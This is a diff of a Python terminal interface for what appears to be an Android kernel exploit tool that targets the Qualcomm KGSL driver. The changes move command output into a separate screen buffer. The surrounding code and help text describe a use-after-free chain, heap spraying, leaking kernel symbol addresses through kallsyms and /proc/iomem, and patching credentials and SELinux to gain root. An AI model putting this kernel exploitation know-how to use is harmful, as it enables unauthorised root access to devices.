@@ -15,31 +15,27 @@ import select
 import termios
 import tty
 
-# v4.1.30-separate-buffers: visible build tag.
-# The "-separate-buffers" suffix marks the FINAL
-# fix for the TUI vs command-output conflict.
-# The user said: "разделить обновления данных и
-# терминала разные буферы! Что так сложно точечно
-# найти функции и разделить их?!"
-# The solution is "разделены по времени" (separated
-# in time), not in space:
-#   - When self._cmd_running is True, the TUI redraw
-#     is SKIPPED entirely. The command output stays
-#     visible on stdout, the user can read it.
-#   - When the command finishes, _cmd_running goes
-#     back to False. The next TUI redraw (0.3s of
-#     idle or any keypress) re-renders the full TUI
-#     body on top of the (cleared) screen.
-# This is the simplest possible separation: just
-# pause one while the other runs.
-# Previous attempts (v4.1.23-29) tried to do "2 zones
-# in space" (TUI on top, terminal on bottom) but all
-# of them had bleed-through because the TUI body
-# naturally overflows into the terminal zone.
-# v4.1.30 goes back to "1 zone, 2 phases" which is
-# what worked in v4.1.22, but with a flag that
-# pauses the TUI during command execution.
-_BUILD_TAG = "v4.1.30-separate-buffers"
+# v4.1.31-all-buttons: visible build tag. The
+# "-all-buttons" suffix marks the FULL migration of
+# all command outputs to the SEPARATE BUFFER system.
+# The user said: "Остальные кнопки обнови!" (update
+# the other buttons). v4.1.30 only migrated
+# vcomm/tstack/englog. v4.1.31 migrates ALL the
+# remaining commands:
+#   - log, list, kb, stats, dev (info)
+#   - pidmap, iomem, syms, ksd
+#   - help (full help text)
+# All of them now use self._terminal_print() which
+# writes to the SEPARATE TERMINAL BUFFER (rows 16 to
+# tty_h-2). The TUI buffer (rows 1-15) is independent.
+# Also the terminal panel now shows up to (tty_h-17)
+# lines (16+ for default 32-row terminal), up from
+# 8 lines in v4.1.30. Long outputs (log: 20+ lines,
+# list: 25+ lines, help: 40+ lines) are now visible.
+# TUI redraws are PAUSED while a command runs
+# (self._cmd_running flag), so the user can see the
+# full output without it being overwritten.
+_BUILD_TAG = "v4.1.31-all-buttons"
 import datetime
 import fcntl
 import ctypes
@@ -1422,40 +1418,50 @@ class MemoryExplorerAI:
         self._render_terminal_panel()
 
     def _render_terminal_panel(self):
-        """v4.1.30: render the TERMINAL BUFFER (rows 17-24).
-        This is INDEPENDENT of the TUI buffer (rows 1-15).
-        TUI redraws do not call this function. The two
-        buffers are completely separate.
+        """v4.1.30: render the TERMINAL BUFFER (rows 16+
+        up to tty_h-2). This is INDEPENDENT of the TUI
+        buffer (rows 1-15). TUI redraws do not call this
+        function. The two buffers are completely separate.
 
-        Layout:
-          - Rows 1-15:  TUI buffer (live status)
-          - Row 16:     separator
-          - Rows 17-24: terminal buffer (last 8 lines of
-                        command output)
-          - Row 25:     separator
-          - Row 26:     prompt
+        v4.1.31: show MORE lines (16 instead of 8) and
+        use a dynamic line count based on terminal
+        height. The user can see the full output of
+        commands like 'log' (20+ lines), 'list' (25+
+        lines), 'dev' (15+ lines), 'help' (40+ lines).
+        The TUI body is fixed at 15 lines (rows 1-15).
+        The terminal gets everything else (rows 16 to
+        tty_h-1). Prompt is at the last line.
         """
         if not hasattr(self, "_terminal_buf"):
             self._terminal_buf = collections.deque(maxlen=200)
-        # Position cursor at row 16, clear rows 16-25
-        sys.stdout.write("\033[16;1H\033[J")
-        # Separator
-        sys.stdout.write(f"{C.GRY}{'─'*92}{C.RST}\n")
-        # Print last 8 terminal lines
-        out_lines = list(self._terminal_buf)[-8:]
+        try:
+            tty_h = self._term_height
+        except AttributeError:
+            tty_h = 32
+        TUI_LINES = 15
+        prompt_row = tty_h  # last row
+        sep_row = tty_h - 1  # separator just above prompt
+        # Terminal gets rows 16 .. sep_row-1
+        term_rows = sep_row - (TUI_LINES + 1)  # rows 16..sep_row-1
+        if term_rows < 4:
+            term_rows = 4
+        # Position cursor at start of terminal area (row 16)
+        sys.stdout.write(f"\033[{TUI_LINES+1};1H\033[J")
+        out_lines = list(self._terminal_buf)[-term_rows:]
         for line in out_lines:
             # Truncate long lines
             stripped = self._strip_ansi(line)
             if len(stripped) > 88:
                 line = line[:150] + C.RST
-            sys.stdout.write(f" {line}\n")
-        # Pad to 8 lines
-        for _ in range(8 - len(out_lines)):
+            sys.stdout.write(f" {line}\033[K\n")
+        # Pad to term_rows lines
+        for _ in range(term_rows - len(out_lines)):
             sys.stdout.write("\033[2K\n")
-        # Separator at row 25
+        # Separator at sep_row
+        sys.stdout.write(f"\033[{sep_row};1H\033[2K")
         sys.stdout.write(f"{C.GRY}{'─'*92}{C.RST}\n")
-        # Re-emit prompt at row 26
-        sys.stdout.write("\033[26;1H\033[2K")
+        # Re-emit prompt at last row
+        sys.stdout.write(f"\033[{prompt_row};1H\033[2K")
         self._print_prompt(getattr(self, "_input_buf", ""))
         sys.stdout.flush()
 
@@ -7647,107 +7653,98 @@ class MemoryExplorerAI:
                 # rate<N> — change render FPS live
                 pass  # rate command removed (single-thread mode)
             elif cmd in ("log", "logs"):
-                # show last 20 spray log entries
-                # We pause the render thread so the user can see the
-                # log clearly without it being overwritten.
+                # v4.1.30: use the SEPARATE BUFFER terminal
+                # printer instead of print(C.CLR). The CLR
+                # would erase the TUI body and the user
+                # would lose the live status. With
+                # _terminal_print, the output is appended
+                # to a buffer and rendered in the bottom
+                # panel (rows 17-24) WITHOUT touching the
+                # TUI body.
                 try:
-                    self._render_paused_set_noop()  # no-op in single-thread
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== SPRAY LOG (last 20) ==={C.RST}", flush=True)
-                    print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== SPRAY LOG "
+                        f"(last 20) ==={C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*65}{C.RST}")
                     if not self.spray_log:
-                        print(f"{C.GRY}(empty — no sprays yet){C.RST}", flush=True)
+                        out_lines.append(
+                            f"{C.GRY}(empty — no sprays yet){C.RST}")
                     else:
                         for e in self.spray_log[-20:]:
-                            print(json.dumps(e), flush=True)
-                    print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
-                    print(f"\n{C.GRY}Log file: {C.WHT}{self.log_path}{C.RST}", flush=True)
-                    print("Press Enter to return...", flush=True)
-                    try:
-                        self.input_cmd()
-                    except Exception:
-                        pass
-                finally:
-                    pass  # (no-op, single-thread)
+                            out_lines.append(json.dumps(e))
+                    out_lines.append(f"{C.GRY}{'─'*65}{C.RST}")
+                    out_lines.append(
+                        f"{C.GRY}Log file: {C.WHT}"
+                        f"{self.log_path}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
+                except Exception as _e:
+                    self._terminal_print(f" log error: {_e}")
             elif cmd in ("list", "ls", "items"):
-                # Show ALL found items (paginated 25 per page)
-                # Pause the render thread so it doesn't clobber our output.
                 try:
-                    self._render_paused_set_noop()  # no-op in single-thread
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== FOUND MEMORY OFFSETS ({len(self.found_items)} total) ==={C.RST}", flush=True)
-                    print(f"{C.GRY}{'─'*92}{C.RST}", flush=True)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== FOUND MEMORY OFFSETS "
+                        f"({len(self.found_items)} total) ==={C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*65}{C.RST}")
                     if not self.found_items:
-                        print(f"{C.GRY}(empty — no items yet){C.RST}", flush=True)
+                        out_lines.append(
+                            f"{C.GRY}(empty — no items yet){C.RST}")
                     else:
-                        page_size = 25
-                        total = len(self.found_items)
-                        pages = (total + page_size - 1) // page_size
-                        page = 0
-                        while page < pages:
-                            start = page * page_size
-                            end = min(start + page_size, total)
-                            print(f"{C.MAG}── Page {page+1}/{pages} "
-                                  f"({start}..{end-1}) ──{C.RST}", flush=True)
-                            for i in range(start, end):
-                                it = self.found_items[i]
-                                color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
-                                         "System App": C.BLU, "Kernel Code": C.MAG,
-                                         "SELinux": C.RED, "SELinux (PATCHED)": C.GRN,
-                                         "Privilege Struct (ROOTED)": C.GRN,
-                                         "Kernel Global": C.CYN}.get(it['type'], C.GRY)
-                                print(f" {C.GRY}[{i:02d}]{C.RST} "
-                                      f"{color}{it['type']:<24}{C.RST} "
-                                      f"{C.WHT}{it.get('description','')[:50]:<50}{C.RST} "
-                                      f"{C.CYN}{it['va']}{C.RST}", flush=True)
-                            page += 1
-                            if page < pages:
-                                print(f"\n{C.GRY}-- More -- (Enter for next page, q to quit){C.RST}", flush=True)
-                                nxt = self.input_cmd().strip().lower()
-                                if nxt in ("q", "quit", "x"):
-                                    break
-                    print(f"{C.GRY}{'─'*92}{C.RST}", flush=True)
-                    print("Press Enter to return...", flush=True)
-                    try:
-                        self.input_cmd()
-                    except Exception:
-                        pass
-                finally:
-                    pass  # (no-op, single-thread)
-            elif True:
-                pass  # (no-op, single-thread)
+                        for i, it in enumerate(self.found_items[:25]):
+                            color = {
+                                "Kernel Core": C.RED,
+                                "Privilege Struct": C.YEL,
+                                "System App": C.BLU,
+                                "Kernel Code": C.MAG,
+                                "SELinux": C.RED,
+                                "SELinux (PATCHED)": C.GRN,
+                                "Privilege Struct (ROOTED)": C.GRN,
+                                "Kernel Global": C.CYN,
+                            }.get(it['type'], C.GRY)
+                            out_lines.append(
+                                f" {C.GRY}[{i:02d}]{C.RST} "
+                                f"{color}{it['type']:<22}{C.RST} "
+                                f"{C.WHT}{it.get('description','')[:40]:<40}{C.RST} "
+                                f"{C.CYN}{it['va']}{C.RST}")
+                        if len(self.found_items) > 25:
+                            out_lines.append(
+                                f"{C.DIM}... and "
+                                f"{len(self.found_items)-25} more{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*65}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
+                except Exception as _e:
+                    self._terminal_print(f" list error: {_e}")
             elif cmd in ("kb", "kbase"):
-                # Show kernel base / SELinux / init_cred status
+                # v4.1.30 SEPARATE BUFFER
                 try:
-                    self._render_paused_set_noop()  # no-op in single-thread
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== KERNEL INTELLIGENCE ==={C.RST}", flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print(f" {C.BOLD}Kernel base{C.RST} : "
-                          f"{C.GRN if self.kernel_base else C.RED}"
-                          f"{hex(self.kernel_base) if self.kernel_base else 'NOT FOUND'}{C.RST}", flush=True)
-                    print(f" {C.BOLD}SELinux VA {C.RST} : "
-                          f"{C.GRN if self.selinux_va else C.RED}"
-                          f"{hex(self.selinux_va) if self.selinux_va else 'NOT FOUND'}{C.RST}", flush=True)
-                    print(f" {C.BOLD}init_cred  {C.RST} : "
-                          f"{C.GRN if self.cred_va else C.RED}"
-                          f"{hex(self.cred_va) if self.cred_va else 'NOT FOUND'}{C.RST}", flush=True)
-                    print(f"\n {C.DIM}AI patterns learned{C.RST}: "
-                          f"{C.MAG}{self.live.get('ai_patterns', 0)}{C.RST}", flush=True)
-                    print(f" {C.DIM}Knowledge base entries{C.RST}: "
-                          f"{C.MAG}{sum(len(v) for v in self.knowledge_base.values() if isinstance(v, list))}{C.RST}", flush=True)
-                    print(f" {C.DIM}Render rate{C.RST}: "
-                          f"{C.MAG}{self.render_hz:.1f} Hz{C.RST}", flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print("Press Enter to return...", flush=True)
-                    try:
-                        self.input_cmd()
-                    except Exception:
-                        pass
-                finally:
-                    pass  # (no-op, single-thread)
-            elif True:
-                pass  # (no-op, single-thread)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== KERNEL INTELLIGENCE ==="
+                        f"{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Kernel base{C.RST} : "
+                        f"{C.GRN if self.kernel_base else C.RED}"
+                        f"{hex(self.kernel_base) if self.kernel_base else 'NOT FOUND'}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}SELinux VA {C.RST} : "
+                        f"{C.GRN if self.selinux_va else C.RED}"
+                        f"{hex(self.selinux_va) if self.selinux_va else 'NOT FOUND'}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}init_cred  {C.RST} : "
+                        f"{C.GRN if self.cred_va else C.RED}"
+                        f"{hex(self.cred_va) if self.cred_va else 'NOT FOUND'}{C.RST}")
+                    out_lines.append(
+                        f" {C.DIM}AI patterns{C.RST}: "
+                        f"{C.MAG}{self.live.get('ai_patterns', 0)}{C.RST}")
+                    out_lines.append(
+                        f" {C.DIM}KB entries {C.RST}: "
+                        f"{C.MAG}{sum(len(v) for v in self.knowledge_base.values() if isinstance(v, list))}{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
+                except Exception as _e:
+                    self._terminal_print(f" kb error: {_e}")
             elif cmd in ("xt", "xattr", "togglesetxattr"):
                 # Toggle setxattr spray technique. Default OFF
                 # because raw syscall(188) can trigger SIGSYS on
@@ -7771,14 +7768,16 @@ class MemoryExplorerAI:
                 n = self.load_kallsyms()
                 self.live["last_msg"] = f"kallsyms reloaded: {n} symbols"
             elif cmd in ("ksd", "kdump"):
-                # Dump kallsyms cache
+                # v4.1.30 SEPARATE BUFFER
                 if not self.kallsyms:
-                    print("kallsyms: empty (not loaded)", flush=True)
+                    self._terminal_print("kallsyms: empty (not loaded)")
                 else:
-                    print(f"kallsyms ({len(self.kallsyms)} symbols):",
-                          flush=True)
+                    out_lines = [
+                        f"kallsyms ({len(self.kallsyms)} symbols):"]
                     for name, addr in sorted(self.kallsyms.items()):
-                        print(f"  0x{addr:016x}  {name}", flush=True)
+                        out_lines.append(
+                            f"  0x{addr:016x}  {name}")
+                    self._terminal_print("\n".join(out_lines))
             elif cmd in ("root", "r00t", "checkroot"):
                 # Manually check root status. Same as the
                 # periodic watchdog check, but on demand.
@@ -7817,36 +7816,104 @@ class MemoryExplorerAI:
                         self.live["last_msg"] = (
                             "KGSL spray FAILED (ioctl rejected)")
             elif cmd in ("stats", "stat"):
-                # Detailed learning statistics
+                # v4.1.30 SEPARATE BUFFER
                 try:
-                    self._render_paused_set_noop()  # no-op in single-thread
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== AI LEARNING STATS ==={C.RST}", flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== AI LEARNING STATS ==="
+                        f"{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
                     s = getattr(self, "learn_stats", {}) or {}
-                    print(f" {C.BOLD}Batches run{C.RST}      : {C.MAG}{s.get('batches', 0)}{C.RST}", flush=True)
-                    print(f" {C.BOLD}Sprays total{C.RST}     : {C.MAG}{s.get('sprayed_total', 0)}{C.RST}", flush=True)
-                    print(f" {C.BOLD}Matches{C.RST}          : {C.YEL}{s.get('matches', 0)}{C.RST}", flush=True)
-                    print(f" {C.BOLD}Verified{C.RST}         : {C.GRN}{s.get('verified', 0)}{C.RST}", flush=True)
-                    print(f" {C.BOLD}Auto-kept{C.RST}        : {C.CYN}{s.get('auto_kept', 0)}{C.RST} (weak-but-interesting)", flush=True)
-                    print(f" {C.BOLD}False positives{C.RST}  : {C.RED}{s.get('false_positives', 0)}{C.RST}", flush=True)
+                    out_lines.append(
+                        f" {C.BOLD}Batches run{C.RST}      : "
+                        f"{C.MAG}{s.get('batches', 0)}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Sprays total{C.RST}     : "
+                        f"{C.MAG}{s.get('sprayed_total', 0)}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Matches{C.RST}          : "
+                        f"{C.YEL}{s.get('matches', 0)}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Verified{C.RST}         : "
+                        f"{C.GRN}{s.get('verified', 0)}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Auto-kept{C.RST}        : "
+                        f"{C.CYN}{s.get('auto_kept', 0)}{C.RST} "
+                        f"(weak-but-interesting)")
+                    out_lines.append(
+                        f" {C.BOLD}False positives{C.RST}  : "
+                        f"{C.RED}{s.get('false_positives', 0)}{C.RST}")
                     if s.get("matches", 0) > 0:
                         rate = 100.0 * s.get("verified", 0) / s["matches"]
-                        print(f" {C.BOLD}Verify rate{C.RST}      : {C.MAG}{rate:.1f}%{C.RST}", flush=True)
-                    print(f"\n {C.DIM}Found items in list{C.RST}: {C.MAG}{len(self.found_items)}{C.RST}", flush=True)
-                    print(f" {C.DIM}Spray procs alive{C.RST}  : {C.MAG}{len(self.spray_procs)}{C.RST}", flush=True)
-                    print(f" {C.DIM}Engine PID{C.RST}        : {C.MAG}{self.live.get('engine_pid', 0)}{C.RST}", flush=True)
-                    print("", flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print("Press Enter to return...", flush=True)
+                        out_lines.append(
+                            f" {C.BOLD}Verify rate{C.RST}      : "
+                            f"{C.MAG}{rate:.1f}%{C.RST}")
+                    out_lines.append(
+                        f" {C.DIM}Found items{C.RST}        : "
+                        f"{C.MAG}{len(self.found_items)}{C.RST}")
+                    out_lines.append(
+                        f" {C.DIM}Spray procs alive{C.RST}  : "
+                        f"{C.MAG}{len(self.spray_procs)}{C.RST}")
+                    out_lines.append(
+                        f" {C.DIM}Engine PID{C.RST}         : "
+                        f"{C.MAG}{self.live.get('engine_pid', 0)}{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
+                except Exception as _e:
+                    self._terminal_print(f" stats error: {_e}")
+            elif cmd in ("device", "dev", "info"):
+                # v4.1.30 SEPARATE BUFFER
+                try:
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== DEVICE / RUNTIME INFO ==="
+                        f"{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    for prop, label in [
+                        ("ro.product.manufacturer", "Manufacturer"),
+                        ("ro.product.model",        "Model"),
+                        ("ro.product.brand",        "Brand"),
+                        ("ro.product.device",       "Device"),
+                        ("ro.build.version.release", "Android ver"),
+                        ("ro.build.version.sdk",    "SDK"),
+                        ("ro.product.cpu.abi",      "ABI"),
+                        ("ro.boot.hardware",        "Hardware"),
+                        ("ro.kernel.qemu",          "QEMU"),
+                    ]:
+                        try:
+                            val = subprocess.check_output(
+                                ["getprop", prop],
+                                text=True, timeout=1).strip()
+                        except Exception:
+                            val = "—"
+                        out_lines.append(
+                            f" {C.BOLD}{label:<14}{C.RST}: "
+                            f"{C.WHT}{val}{C.RST}")
                     try:
-                        self.input_cmd()
+                        sz = os.path.getsize(self.engine_path)
                     except Exception:
-                        pass
-                finally:
-                    pass  # (no-op, single-thread)
-            elif True:
-                pass  # (no-op, single-thread)
+                        sz = 0
+                    out_lines.append(
+                        f" {C.BOLD}Engine{C.RST}     : "
+                        f"{C.CYN}{self.engine_path}{C.RST} "
+                        f"({sz} bytes)")
+                    out_lines.append(
+                        f" {C.BOLD}PID{C.RST}        : "
+                        f"{C.CYN}{self.live.get('engine_pid', 0)}{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Uptime{C.RST}     : "
+                        f"{C.CYN}{int(time.time() - self.live['uptime_start'])}s"
+                        f"{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}RAM{C.RST}        : "
+                        f"{C.CYN}{self.live.get('ram', 0):.1f}%{C.RST}")
+                    out_lines.append(
+                        f" {C.BOLD}Render rate{C.RST}: "
+                        f"{C.CYN}{self.render_hz:.1f} Hz{C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
+                except Exception as _e:
+                    self._terminal_print(f" dev error: {_e}")
             elif cmd in ("save", "dump", "export"):
                 # Save found items to JSON file
                 out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
@@ -7909,24 +7976,18 @@ class MemoryExplorerAI:
                 finally:
                     pass  # (no-op, single-thread)
             elif cmd in ("pidmap", "pstack", "pidscan"):
-                # v4.1: read /proc/PID/stack for each live spray
-                # PID to find the kernel stack pointer. The kernel
-                # stack is allocated right next to the task_struct
-                # in the slab (on 5.4 ARM64: stack at task+offset,
-                # comm at task+0x718). Once we have a stack pointer,
-                # we can scan a small window to find the actual
-                # task_struct and verify the comm.
+                # v4.1.30 SEPARATE BUFFER
                 try:
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== PID STACK MAP ==={C.RST}",
-                          flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== PID STACK MAP ==={C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
                     all_pids = set()
                     for s in self.spray_procs_by_worker.values():
                         all_pids.update(s)
                     if not all_pids:
-                        print(f"  {C.RED}no spray procs alive{C.RST}",
-                              flush=True)
+                        out_lines.append(
+                            f"  {C.RED}no spray procs alive{C.RST}")
                     found = 0
                     for pid in list(all_pids)[:10]:
                         try:
@@ -7937,67 +7998,56 @@ class MemoryExplorerAI:
                         stack_ptr = self.read_proc_stack(pid)
                         if stack_ptr:
                             found += 1
-                            print(f"  pid={pid:<7} comm={comm:<10} "
-                                  f"stack=0x{stack_ptr:x}", flush=True)
+                            out_lines.append(
+                                f"  pid={pid:<7} comm={comm:<10} "
+                                f"stack=0x{stack_ptr:x}")
                         else:
-                            print(f"  pid={pid:<7} comm={comm:<10} "
-                                  f"{C.YEL}stack=N/A (perms?){C.RST}",
-                                  flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print(f"  {C.BOLD}{found} stacks readable{C.RST} "
-                          f"(use [rva <hex>] to read pages)", flush=True)
-                    print("Press Enter to return...", flush=True)
-                    try:
-                        self.input_cmd()
-                    except Exception:
-                        pass
+                            out_lines.append(
+                                f"  pid={pid:<7} comm={comm:<10} "
+                                f"{C.YEL}stack=N/A (perms?){C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    out_lines.append(
+                        f"  {C.BOLD}{found} stacks readable{C.RST} "
+                        f"(use [rva <hex>] to read pages)")
+                    self._terminal_print("\n".join(out_lines))
                 except Exception as e:
                     self.live["last_msg"] = f"pidmap error: {e}"
             elif cmd in ("iomem", "ioreg"):
-                # v4.1: read /proc/iomem. World-readable on most
-                # stock Android. Reveals kernel text/data layout
-                # which is the missing piece for finding kernel
-                # virtual addresses without kallsyms.
+                # v4.1.30 SEPARATE BUFFER
                 try:
                     regions = self.parse_iomem()
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== /proc/iomem ==={C.RST}",
-                          flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== /proc/iomem ==={C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
                     if not regions:
-                        print(f"  {C.RED}/proc/iomem empty or restricted{C.RST}",
-                              flush=True)
+                        out_lines.append(
+                            f"  {C.RED}/proc/iomem empty or "
+                            f"restricted{C.RST}")
                     else:
                         keywords = ("Kernel", "System RAM", "vmalloc",
                                     "mem", "reserved")
                         for start, end, name in regions:
                             if any(kw.lower() in name.lower()
                                    for kw in keywords):
-                                print(f"  0x{start:08x}-0x{end:08x} : {name}",
-                                      flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print("Press Enter to return...", flush=True)
-                    try:
-                        self.input_cmd()
-                    except Exception:
-                        pass
+                                out_lines.append(
+                                    f"  0x{start:08x}-0x{end:08x} : "
+                                    f"{name}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
                 except Exception as e:
                     self.live["last_msg"] = f"iomem error: {e}"
             elif cmd in ("syms", "kallsyms2", "allsyms"):
-                # v4.1: re-read /proc/kallsyms (and try
-                # thread-self variant) without the kptr_restrict
-                # filter. On some Android kernels the latter
-                # leaks real addresses even when /proc/kallsyms
-                # is zeroed.
+                # v4.1.30 SEPARATE BUFFER
                 try:
                     syms = self.parse_kallsyms_raw()
-                    print(C.CLR, end="", flush=True)
-                    print(f"{C.BOLD}{C.CYN}=== KALLSYMS DEEP ==={C.RST}",
-                          flush=True)
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print(f"  total: {len(syms)}", flush=True)
+                    out_lines = []
+                    out_lines.append(
+                        f"{C.BOLD}{C.CYN}=== KALLSYMS DEEP ==={C.RST}")
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    out_lines.append(f"  total: {len(syms)}")
                     non_zero = {k: v for k, v in syms.items() if v != 0}
-                    print(f"  non-zero: {len(non_zero)}", flush=True)
+                    out_lines.append(f"  non-zero: {len(non_zero)}")
                     for k in ("prepare_kernel_cred", "commit_creds",
                               "selinux_enforcing", "init_cred",
                               "init_task", "selinux_state",
@@ -8005,7 +8055,8 @@ class MemoryExplorerAI:
                         v = syms.get(k)
                         if v:
                             col = C.GRN if v != 0 else C.YEL
-                            print(f"  {col}{k}{C.RST} = 0x{v:x}", flush=True)
+                            out_lines.append(
+                                f"  {col}{k}{C.RST} = 0x{v:x}")
                             if v != 0:
                                 if k == "prepare_kernel_cred" and not self.kernel_base:
                                     self.kernel_base = v & ~0x1fffff
@@ -8015,16 +8066,10 @@ class MemoryExplorerAI:
                                     self.cred_va = v
                                 elif k == "init_task":
                                     self.init_task_va = v
-                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
-                    print("Press Enter to return...", flush=True)
-                    try:
-                        self.input_cmd()
-                    except Exception:
-                        pass
+                    out_lines.append(f"{C.GRY}{'─'*60}{C.RST}")
+                    self._terminal_print("\n".join(out_lines))
                 except Exception as e:
                     self.live["last_msg"] = f"syms error: {e}"
-            elif True:
-                pass  # (no-op, single-thread)
             elif cmd in ("clear_kb", "reset_kb"):
                 # Reset knowledge base
                 self.knowledge_base = {
@@ -8403,47 +8448,63 @@ class MemoryExplorerAI:
                 else:
                     self.live["last_msg"] = f"symlook: '{name}' NOT found"
             elif cmd in ("help", "?", "h"):
-                # Show full help
-                sys.stdout.write(C.CLR)
-                sys.stdout.write(f"{C.BOLD}{C.CYN}=== KGSL AI MEMORY EXPLORER — HELP ==={C.RST}\n")
-                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
+                # v4.1.30 SEPARATE BUFFER
+                out_lines = []
+                out_lines.append(
+                    f"{C.BOLD}{C.CYN}=== KGSL AI MEMORY EXPLORER "
+                    f"— HELP ==={C.RST}")
+                out_lines.append(f"{C.GRY}{'─'*75}{C.RST}")
                 lines = [
-                    ("A / autopilot",     "Toggle AUTOPILOT (auto-starts on launch)"),
+                    ("A / autopilot",     "Toggle AUTOPILOT (auto-starts)"),
                     ("P / pause",         "Pause autopilot (still responsive)"),
                     ("G / go / resume",   "Resume autopilot after pause"),
                     ("X / stop",          "Stop autopilot completely"),
-                    ("E / exploit",       "Manual: run KGSL UAF → auto chain (kbase→selinux→cred→patch)"),
-                    ("L / learn",         "Manual: start AI learning in background (Ctrl+P to cancel)"),
+                    ("E / exploit",       "Manual: run KGSL UAF → chain"),
+                    ("L / learn",         "Manual: start AI learning"),
                     ("S / scan",          "Manual: one-shot scan of UAF range"),
-                    ("W / watch",         "Manual: auto-retry exploit pipeline in background (toggle)"),
-                    ("C / clear",         "Kill all spray processes, free RAM"),
-                    ("R / root",          "Verify current uid (id command)"),
-                    ("B / build",         "Recompile C engine (gcc/clang)"),
+                    ("W / watch",         "Manual: auto-retry pipeline"),
+                    ("C / clear",         "Kill all spray processes"),
+                    ("R / root",          "Verify current uid"),
+                    ("B / build",         "Recompile C engine"),
                     ("Q / quit",          "Exit explorer"),
-                    ("<id>",              "Open detail view of found item #id"),
-                    ("v<id>",             "Re-verify found item #id (re-read VA)"),
-                    ("walk <id> [off]",   "Walk cred chain from item #id @ offset (default 0x770)"),
-                    ("selsearch [s e stp]","Brute-force scan for SELinux enforcing in kernel data"),
-                    ("symlook <name>",    "Search kernel rodata for a string symbol"),
-                    ("list / ls / items", "Paginated dump of ALL found items"),
-                    ("kb / kbase",        "Show kernel base / SELinux / init_cred status"),
+                    ("vcomm / verifycomm","Verify spray PIDs have KETO/KETW comm"),
+                    ("v<id>",             "Re-verify found item #id"),
+                    ("walk <id> [off]",   "Walk cred chain from item #id"),
+                    ("selsearch",         "Brute-force scan for SELinux"),
+                    ("symlook <name>",    "Search kernel rodata for a string"),
+                    ("list / ls / items", "Show ALL found items (max 25)"),
+                    ("kb / kbase",        "Show kernel base / SELinux / init_cred"),
+                    ("kb / kbase",        "Common QCOM kernel bases (fallback)"),
                     ("log / logs",        "Show recent spray log (JSONL)"),
                     ("stats / stat",      "Show AI learning statistics"),
-                    ("save / export",     "Save found items → found_items.json"),
+                    ("save / export",     "Save found items → JSON"),
                     ("dev / device",      "Show device info (getprop)"),
-                    ("verify / vsf",      "Verify spray procs have KETO/KETW comm"),
                     ("iomem / ioreg",     "Read /proc/iomem for kernel layout"),
                     ("pidmap / pstack",   "Read /proc/PID/stack for spray PIDs"),
-                    ("syms / allsyms",    "Deep-read /proc/kallsyms (+ thread-self)"),
-                    ("health / diag",     "Full health check: engine/kgsl/kallsyms/workers/RAM"),
-                    ("reset_kb",          "Reset knowledge base"),
